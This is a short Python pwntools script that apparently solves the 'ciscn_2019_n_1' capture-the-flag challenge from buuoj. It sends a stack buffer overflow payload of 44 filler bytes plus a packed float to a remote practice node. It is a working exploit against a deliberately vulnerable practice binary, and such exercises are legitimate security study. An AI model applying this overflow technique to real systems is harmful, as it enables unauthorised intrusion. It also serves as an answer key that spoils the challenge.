from pwn import *


def ciscn_2019_n_1(file_name='/mnt/hgfs/CyberSecurity/PWN/buuoj/ciscn_2019_n_1'):
    context(log_level='debug', arch='amd64', os='linux')
    target = process([file_name])
    target = remote('node5.buuoj.cn', 26338)
    target_elf = ELF(file_name)

    float_num = 11.28125
    float_bytes = struct.pack('f', float_num)
    print(float_bytes)

    payload = b'A' * 44
    payload += float_bytes

    target.sendline(payload)
    print(target.recv())
    print(target.recv())


if __name__ == '__main__':
    ciscn_2019_n_1()
